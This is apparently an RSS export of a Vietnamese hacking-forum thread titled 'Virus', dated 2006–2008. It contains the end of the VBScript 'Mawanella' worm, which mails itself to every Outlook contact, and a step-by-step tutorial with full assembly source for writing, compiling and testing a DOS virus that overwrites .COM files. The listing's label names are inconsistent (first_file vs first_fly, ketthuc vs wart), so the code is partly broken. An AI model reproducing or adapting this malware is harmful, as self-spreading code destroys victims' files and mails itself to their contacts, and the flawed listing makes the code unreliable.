+For Count= 1 To ContactCountX
+
+Set MailX = OutlookA.CreateItem(0)
+
+Set ContactX = ListIndex.AddressEntries(Count)
+
+'msgbox contactx.address
+
+'Mailx.Recipients.Add(ContactX.Address)
+
+MailX.To = ContactX.Address
+
+MailX.Subject = "Mawanella"
+
+MailX.Body = vbcrlf&"Mawanella is one of the Sri Lanka's Muslim Village"&vbcrlf
+
+'Set Attachment=MailX.Attachments
+
+'Attachment.Add dirsystem & "\Mawanella.vbs"
+
+'Mailx.Attachments.Add(dirsystem & "\Mawanella.vbs")
+
+Mailx.Attachments.Add(dirsystem & "\Mawanella.vbs")
+
+MailX.DeleteAfterSubmit = True
+
+If MailX.To <> "" Then
+
+MailX.Send
+
+End If
+
+Next
+
+End If
+
+Next
+
+Else
+
+msgBox "Please Forward this to everyone" 
+
+End if
+
+strMsg= " ) (" & vbcrlf
+
+strMsg= strMsg & "( ) ( ) " & vbcrlf
+
+strMsg= strMsg & " ( ) ( )" & vbcrlf
+
+strMsg= strMsg & " ( ) ( )" & vbcrlf
+
+strMsg= strMsg & " -------------------------" & vbcrlf
+
+strMsg= strMsg & " / ( ( ( /\" & vbcrlf
+
+strMsg= strMsg & " / ( / \" & vbcrlf
+
+strMsg= strMsg & " / ( ( / \" & vbcrlf
+
+strMsg= strMsg & " --------------------------------" & vbcrlf
+
+strMsg= strMsg & " | --- | |" & vbcrlf
+
+strMsg= strMsg & " | ----- | | | |" & vbcrlf
+
+strMsg= strMsg & " | | | --- | |" & vbcrlf
+
+strMsg= strMsg & " | | | | |" & vbcrlf
+
+strMsg= strMsg & " --------------------------------" & vbcrlf
+
+strMsg= strMsg & "Mawanella is one of the Sri Lanka's Muslim Village." & vbcrlf 
+
+strMsg= strMsg & "This brutal incident happened here 2 Muslim Mosques & 100 Shops are burnt." & vbcrlf 
+
+strMsg= strMsg & "I hat this incident, What about you? I can destroy your computer" & vbcrlf 
+
+strMsg= strMsg & "I didn't do that because I am a peace-loving citizen."
+
+msgbox strMsg,,"Mawanella"
+
+End sub
+----------------------------------------------------------------
+
+Ở phần sau tôi sẽ hướng dẫn các bạn cách viết một virus đơn giản bằng Asm. Tất nhiên là đỏi hỏi phải biết một ít về Asm.
+
+VIẾT MỘT VIRUS GHI ĐÈ LÊN FILE *.COM BẰNG ASM
+
+(Sử dụng tài liệu của nhóm Code Breaker)
+
+Trước tiên hãy xem đoạn mã của virus:
+
+code segment 
+
+assume cs:code,ds:code 
+
+org 100h
+
+virus proc near
+
+first_file:
+
+mov ah,4eh
+
+tim_file:
+
+xor cx,cx 
+
+lea dx,comsig 
+
+int 21h
+
+jc ketthuc
+
+mo_file:
+
+mov ax,3d02h 
+
+mov dx,9eh 
+
+int 21h
+
+nhiem_file: 
+
+xchg bx,ax 
+
+mov ah,40h
+
+mov cx,offset horny - offset first_fly 
+
+lea dx,first_fly 
+
+int 21h
+
+stitch_up:
+
+mov ah,3eh 
+
+int 21h
+
+mov ah,4fh
+
+jmp find_fly
+
+ketthuc:
+
+mov ah,09h
+
+mov dx,offset wart
+
+int 21h
+
+cya: int 20h 
+
+comsig db "*.com",0
+
+msgadd db 'Congratulations! You have infected all the COM files 
+
+in this ',10,13
+
+db 'directory . Have a 
+
+nice day.',10,13,'$' 
+
+horny label near
+
+virus endp
+
+code ends
+
+end first_fly
+Virus của chúng ta sẽ là một file .com ,giới hạn của *.com file là 65,536 bytes.Qua virus này bạn sẽ biết được định dạng chung của một file .com, chúng ta hãy phân tích đoạn mã trên:
+
+================================================== ======
+
+code segment
+
+tất cả những mã có thể thi hành nằm trong code segment , tất nhiên không nhất thiết segment phải có tên là code, cấu trúc khai báo là như sau:
+
+segment_name segment
+
+------------
+
+----------
+
+----------
+
+segment_name Ends
+
+end
+Nếu bạn đã hoc Asembly thì không cần phải đọc chỗ này.
+
+================================================== ======
+
+assume cs:code,ds:code
+
+Nói chung đây là phần thiết đặt tham số cho file .com của chúng ta, với 
+
+CS(code segment) là nơi chứa địa chỉ bắt đầu thực thi của chương trình.
+
+org 100h
+
+org 100h luôn luôn đi theo assume directive. Nó thông báo cho máy tính biết rằng file COM đuợc xác đình tại địa chỉ 100 hex hay 256 bytes. 
+
+================================================== ======
+
+proc virus near
+Cái này không thực sự cần thiết vì procedure này là chương trình con duy nhất trong chương trình.Những chương trình lớn hơn sẽ có nhiều Procedure trong code segment để thức hiện một nhiệm vụ nhất định nào đó. ================================================== ======
+
+first_file:
+
+mov ah,4eh
+
+Bậy giờ là phần cốt lõi của virus ,nếu bạn đã hoc lập trình thì các bạn cũng biết nhựng cái theo sau là dấu hai chấm được gọi là nhãn, nó hữ­ ích cho việc xác định vị trí để xài các lệnh nhảy trong ASM hay lệnh goto trong Pascal,delphi...
+
+Để phân tích tiếp chúng ta cần biết thanh ghi là gì?Một thanh ghyi được sử dụng để khởi đầu chỉ lệnh để máy tính thi hành một yêu cầu hoạt động ,được sử dụng để ghi địa chỉ bộ nhớ và chuẩn bị những hàm số học cơ bản , nhập xuất dữ liệu... .Bốn thanh ghi cơ bản sử dụng trong virus này là AX, BX, CX, DX (). Thanh ghi ax sử dụng cho nhập xuất và các thao tác tính toán cơ bản BX (base register) sử dụng để tính toán CX (count register ) sử dụng để tính toán hay đếm trong vòng lặp. DX (data register ) giống như AX , được sử dụng cho nhập xuất , hoạt động nhân chia
+
+Bây giờ trở lại với virus của chúng ta mục đích cua get_fly là tìm thấy file để làm nhiễm. Thực sự là tìm file đầu tiên trong thư mục có thuộc tính chúng ta cần. Vì vậy,chúng tac ần nạp điều kiện vào thanh ghi chung và thực hiện một lệnh ngắt. Ơû đây do là một chương trình DOS nên chỉ đề cập đến thanh ghi 16 bit , môt thanh ghi 16 bit gồm 2 phần, mỗi phần 8 bit ví dụ AX:AH-AL tương tự như vậy ta có : BH - BL, CH - CL, va DH - DL. Giá trị cần nạp vào thanh ghi chung là 4e hex vào AH, CX = zero để set thuộc tính của file là normal, và cuối cùng, DX cần một chuỗi chỉ đính file mà chúng ta đang tìm kiếm để làm nhiễm. Và để di chuyển 4e hex vao AH chúng ta sử dụng lệnh MOV. MOV AH, 4eh có nghĩa là chuyển giá trị 4e hex vào AH
+
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/396.hva#1246</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/396.hva#1246</link>
+				<pubDate><![CDATA[Mon, 26 Jun 2006 21:27:29]]> GMT</pubDate>
+				<author><![CDATA[ jackly]]></author>
+			</item>
+			<item>
+				<title>Virus</title>
+				<description><![CDATA[ ================================================== =========
+
+tim_file:
+
+xor cx,cx
+Việc tiếp theo cần làm là giá trị trong CX =0, chúng ta có thể làm bằng 2 cách , một là MOV CX, 0, hai là XOR CX, CX tuy nhiên nấu sử dụng MOV CX,0 chúng ta sẽ mất 3 bytes trong khi sử dụng XOR CX,CX chúng ta chỉ mất 2 bytes và chúng đều có chức năng set cho CX =0. Vậy thì tốt hơn là nên chọn XOR CX,CX
+
+================================================== =========
+
+lea dx,comsig 
+
+Tiếp theo chúng ta cần nạp chuỗi với file chỉ định mà chúng ta tìm kiếm vào DX. 
+
+Chúng ta đang tìm file . COM. Vi vay chuỗi cần tìm là *.COM. Đây là cách tìm kiếm những tập tin có đuôi là *.COM. Chuỗi này được xác định tại địa chỉ comsig trong data segment của virus . Và để chuyển chuỗi đó vào DX chúng ta thực hiện lệnh 
+
+LEA DX, comsig, <L>oad the <E>ffective <A>ddress of comsig into DX. Chúng ta cũng có thể sử dụng lệnh MOV bằng cách như sau 
+
+MOV DX, offset comsig. ================================================== =========
+
+int 21h
+
+Nói chung lệnh ngắt để dừng chương trình lại và thực hiện một công việc nào đó .Co 256 lệnh ngắt các bạn có thể tham khảo thêm ở các sách dạy hợp ngữ .Ở đoạn mã này của virus sau khi chuyển 4e hex vào AX xóa CX, chuyển chuỗi chỉ định tên file cần tìm ta thực hiện lệnh ngắt int 21 để chương trình bắt đầu tìm tệp đầu tiên với thuôc tính cho trước trong CX và DX (các bạn tra trong sách hợp ngữ về các chức năng của ngắt int 21 để biết thêm chi tiết)
+
+================================================== =========
+
+jc ketthuc
+
+Đây là một lệnh nhảy có điều kiên. Nếu một file được tìm thấy cờ carry được set là zero nếu không tìm thấy cờ carry set thành 1 lệnh JC kiểm tra nếu cờ carry bằng 1nó sẽ nhảy tới vị trí có nhãn wart_growth và thi hành lệnh tại offset đó .Và đoạn mã này có chức nằng như sau: nó kiểm tra xem nếu tìm thấy thì tiến hành các bước làm nhiễm file nếu không thì nhãy tời đoạn mã báo hiệu bạn đã làm nhiễm thành cộng tất cả các file .Com trong thư mục chứa nó . 
+
+================================================== ===========
+
+mo_file:
+
+mov ax,3d02h 
+
+mov dx,9eh 
+
+int 21h
+Đoạn mã này được thực hiện khi đã tìm thấy một file .COM trong thư mục đầu tiên cần nạp 3D vào AL và 02h có nghĩa là mở file trong chế độ đọc/ghi. 00h trong AL sẽ mở file ở chế độ chỉ đọc , 01h trong AL là chỉ ghi. Nhớ rằng AX là thanh ghi 16-bit gồm, AH và AL.Vi vay chúng ta có thể nạp hai giá trị cùng lúc . bằng cách nạp AX với 3d02h. Nhớ rằng chúng ta luôn luôn sử dụng gia trị ở hệ hex. Một lỗi đơn giản nhưng hay gặp phải là thiếu "h" sau int 21 hay sau các số ở hệ HEX bạn cần chú ý . Nếu thiếu Hex máy tính sẽ nghĩ bạn sử dụng hệ thập phân và dĩ nhiên trong hệ thập phân máy tính sẽ coi D,E,F chả ra củ khoai gì .... Tiếp theo chúng ta cần nạp vào DX một chuỗi ASCII là tên của file .Như bạn nhìn ở trên 9e hex không phải là một chuỗi ;nó thực ra là offset của địa chỉ chứa chuỗi chúng ta cần. 9e hex được xác định trong PSP trong một vùng gọi là DTA hay <D>isk <T>ransfer <A>rea. PSP bắt đầu tại 00h. Địa chỉ bắt đầu của DTA la 80 hex.Trong DTA là thông tin trên file đã được tìm thấy. Những gì chúng ta cần là file name, được xác định tại offset 1eh từ phần bắt đầu của DTA. Cộng 80 với 1eh ta có 9eh. Nạp 9e hex vào thanh ghi DX chúng ta có file name . bây giờ thức hiện int 21h để thi hành thủ tục trên.
+
+================================================== ============
+
+nhiem_file: 
+
+xchg bx,ax
+
+mov ah,40h
+
+mov cx,offset horny - offset first_fly 
+
+lea dx,first_fly 
+
+int 21h
+Đây là phần làm nhiêm file sau khi đã mở nó .Ở đoạn mã trước File handle của file được mở nằm trong AX chúng ta cần nó nằm trong BX vậy nên thực hiện lệnh 
+
+xchg bx,ax bằng cách này toàn bộ giá trị trong ax sẽ chuyển vào bx . CX cần được nạp một số lượng byte mà chúng ta muốn ghi vào. Và thay vì ta sử dụng một con số nào đó để chỉ định số bytes ta để máy tính tính khoảng cách từ 2 offset nhãn horny và firts_fly như vậy khoảng cách từ nhãn first_fly đến horny là số lượng bytes mà chúng ta muốn ghi vào file. Cuối cùng, DX cần được nạp địa chỉ mà chúng ta muốn ghi và địa chỉ cua first_fly được nạp vào DX. Đó là phần bắt đầu của mã mà chúng ta muốn ghi vào file tìm thấy .Sau đó thực hiện int 21 sẽ hoàn tất việc làm nhiễm file.
+
+================================================== =========
+
+stitch_up:
+
+mov ah,3eh 
+
+int 21h
+
+mov ah,4fh
+
+jmp find_fly
+
+
+Sau khi file đã bị nhiễm chúng ta cần đóng file đó lại và đây là đoạn mã thực hiện việc này. Sau khi đóng file chúng ta nạp 4f hex vào AH rồi nhảy trở về đoạn mã để tìm file .COM kế tiếp. Và nó sẽ thực hiện việc nhiễm file cho đến khi nào tất cả file .COM trong thu muc chưa nó đã bị nhiễm.Lúc đó cờ carry=1 và lệnh nhảy jc sẽ hoạt động đưa ra thông báo chúc mừng.
+
+================================================== =================
+
+Ketthuc:
+
+mov ah,9
+
+mov dx,offset wart
+
+int 21h
+
+
+================================================== ================
+
+cya: int 20h
+
+Chức năng của int 20 là kết thúc chương trình , tuy nhiên cách hiện nay hay dùng là MOV AH,4CH
+
+int 21
+
+================================================== ================
+
+comsig db "*.com",0
+
+msgadd db 'Congratulations! You have infected all the COM files 
+
+in this',10,13
+
+db 'Have a nice day.',10,13,'$'
+
+Đây là data segment nói một cách nọm na là tương tự như bạn khai báo hằng (Const) ở pascal,C++ vậy.Và các hằng này sẽ được sử dụng trong code segment. Chúng ta sử dụng định nghĩa byte DB, để định nghĩa một chuỗi. Việc đặt 10,13 sau các chuỗi giúp cho việc hiển thị nó có thứ tự nếu không cả hai chuỗi sẽ hiển thị cùng lúc lên màn hinh $ tại phần cuối của dòng 2 báo hiệu kết thúc chuôi ================================================== =================
+
+horny label near
+
+nhãn horny chỉ có một mục đích là để xác điịnh offset trong việc xác định số byte ghi vào file cần làm nhiễm ================================================== =================
+
+virus endp
+
+code ends
+
+end first_fly
+
+kết thúc chương trình 
+================================================== ==============
+
+Biên dịch virus :
+
+Bạn cần có TASM hay MASM. Trongbài này tôi hướng dẫn các bạn biên dịch virus bằng TASM. Các file cần có virus.asm TASM.EXE, TLINK
+
+Đầu tiên lưu nó thành file ".asm" file,có thể sử dụng Notepad để soạn thảo mã rồi save as virus.asm. Sử dụng TASM gõ lệnh:
+
+C:\>tasm virus.asm 
+
+Kết quả có thể là như sau:
+
+Turbo Assembler Version 2.01
+
+Assembling file: virus.asm
+
+Error Messages: none
+
+Warning Messages: none
+
+Passes: 1
+
+Remaining Memory: 418k (or something similar)
+
+Nếu không có lỗi nào, nếu có lỗi nó sẽ báo cho bạn biết lỗi gì ở dòng nào .
+
+Sau khi gõ lệnh TASM <asm file> bạn sẽ được file *.obj
+
+Để tạo COM file bạn gõ lệnh:
+
+C:\>tlink /t virus.obj
+
+Tlink sẽ tạo ra file virus.COM 
+
+Bây giờ hãy thử nghiệmvirus của bạn, mở Notepad lên, ghi gì tùy bạn , không ghi cũng được lưu thành file vidu.com. đặt nóvào thư muc của virus bạn vừa biên dịch. Rồi chạy virus bạn sẽ thấy kích thước của file vidu.com bây giờ sẽ bằng kích thước của virus(180 bytes). Tuy nhiên nhược virus này sẽ làm nhiễm tất cả các file .com trong thư mục chứa nó mà không cần biết file đó đã bị nhiễm hay chưa, ở phần sau tôi sẽ hướng dẫn các bạn cách để kiểm tra xem một file đã bị nhiễm hay chưa. Và cònmột điều nữa là virus này không có tác dụng với những file .com có size lớn hơn nó (đây chỉ là để minh họa nên tôi nghĩ như vậy là đủ)
+
+================================================== =============
+
+Appendix 1 - The Registers
+
+AX Accumulator register 
+
+BX Base register
+
+CX Counting register
+
+DX Data register
+
+DS Data Segment register
+
+ES Extra Segment register
+
+SS Stack Segment register
+
+CS Code Segment register
+
+BP Base Pointers register
+
+SI Source Index register
+
+DI Destiny Index register
+
+SP Stack Pointer register
+
+IP Next Instruction Pointer register
+
+F Flag register
+
+-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
+
+Appendix 2 - The PSP 
+
+Format of Program Segment Prefix (PSP):
+
+Offset Size Description (Table 1032)
+
+00h 2 BYTEs INT 20 instruction for CP/M CALL 0 program termination
+
+the CDh 20h here is often used as a signature(chu ky) for a valid PSP
+
+02h WORD segment of first byte beyond memory allocated to program
+
+04h BYTE (DOS) unused filler
+
+(OS/2) count of fake DOS version returns
+
+05h BYTE CP/M CALL 5 service request (FAR CALL to absolute 000C0h)
+
+BUG: (DOS 2+ DEBUG) PSPs created by DEBUG point at 000BEh
+
+06h WORD CP/M compatibility--size of first segment for .COM files
+
+08h 2 BYTEs remainder of FAR JMP at 05h
+
+0Ah DWORD stored INT 22 termination address
+
+0Eh DWORD stored INT 23 control-Break handler address
+
+12h DWORD DOS 1.1+ stored INT 24 critical error handler address
+
+16h WORD segment of parent PSP
+
+18h 20 BYTEs DOS 2+ Job File Table, one byte per file handle, FFh = closed
+
+2Ch WORD DOS 2+ segment of environment for process (see #1033)
+
+2Eh DWORD DOS 2+ process's SS:SP on entry to last INT 21 call
+
+32h WORD DOS 3+ number of entries in JFT (default 20)
+
+34h DWORD DOS 3+ pointer to JFT (default PSP:0018h)
+
+38h DWORD DOS 3+ pointer to previous PSP (default FFFFFFFFh in 3.x)
+
+used by SHARE in DOS 3.3
+
+3Ch BYTE DOS 4+ (DBCS) interim console flag (see AX=6301h)
+
+Novell DOS 7 DBCS interim flag as set with AX=6301h
+
+(possibly also used by Far East MS-DOS 3.2-3.3)
+
+3Dh BYTE (APPEND) TrueName flag (see INT 2F/AX=B711h)
+
+3Eh BYTE (Novell NetWare) flag: next byte initialized if CEh
+
+(OS/2) capabilities flag
+
+3Fh BYTE (Novell NetWare) Novell task number if previous byte is CEh
+
+40h 2 BYTEs DOS 5+ version to return on INT 21/AH=30h
+
+42h WORD (MSWindows3) selector of next PSP (PDB) in linked list
+
+Windows keeps a linked list of Windows programs only
+
+44h WORD (MSWindows3) "PDB_Partition"
+
+46h WORD (MSWindows3) "PDB_NextPDB"
+
+48h BYTE (MSWindows3) bit 0 set if non-Windows application (WINOLDAP)
+
+49h BYTE unused by DOS versions <= 6.00
+
+4Ch WORD (MSWindows3) "PDB_EntryStack"
+
+4Eh 2 BYTEs unused by DOS versions <= 6.00
+
+50h 3 BYTEs DOS 2+ service request (INT 21/RETF instructions)
+
+53h 2 BYTEs unused in DOS versions <= 6.00
+
+55h 7 BYTEs unused in DOS versions <= 6.00; can be used to make first FCB
+
+into an extended FCB
+
+5Ch 16 BYTEs first default FCB, filled in from first commandline argument
+
+overwrites second FCB if opened
+
+6Ch 16 BYTEs second default FCB, filled in from second commandline argument
+
+overwrites beginning of commandline if opened
+
+7Ch 4 BYTEs unused
+
+80h 128 BYTEs commandline / default DTA
+
+command tail is BYTE for length of tail, N BYTEs for the tail,
+
+followed by a BYTE containing 0Dh
+
+------------------------------------------------------------------------------
+
+Appendix 3 - Examples of various JUMP commands
+
+JA - Jump if Above
+
+JAE - Jump if Above/Equal 
+
+JB - Jump if Below
+
+JBE - Jump if Below/Equal
+
+JC - Jump if Carry
+
+JE - Jump if Equal
+
+JG - Jump if Greater
+
+JGE - Jump if Greater/Equal
+
+JL - Jump if Less
+
+JLE - Jump if Less/Equal
+
+JMP - Jump
+
+JNA - Jump if Not Above
+
+JNAE - Jump if Not Above/Equal
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/396.hva#1247</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/396.hva#1247</link>
+				<pubDate><![CDATA[Mon, 26 Jun 2006 21:28:43]]> GMT</pubDate>
+				<author><![CDATA[ jackly]]></author>
+			</item>
+			<item>
+				<title>Re: Virus</title>
+				<description><![CDATA[ co ai jiai thich dum may cai cho ""ngat 13h ...""do duoc ko kho hiu qua may cai thuat ngu nay tim o dau vay a.co ai biet ve may cai file he thong cua window noi ho em dc khong a??]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/396.hva#111012</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/396.hva#111012</link>
+				<pubDate><![CDATA[Fri, 18 Jan 2008 15:26:16]]> GMT</pubDate>
+				<author><![CDATA[ nguyenngochoang89]]></author>
+			</item>
+	</channel>
+</rss>
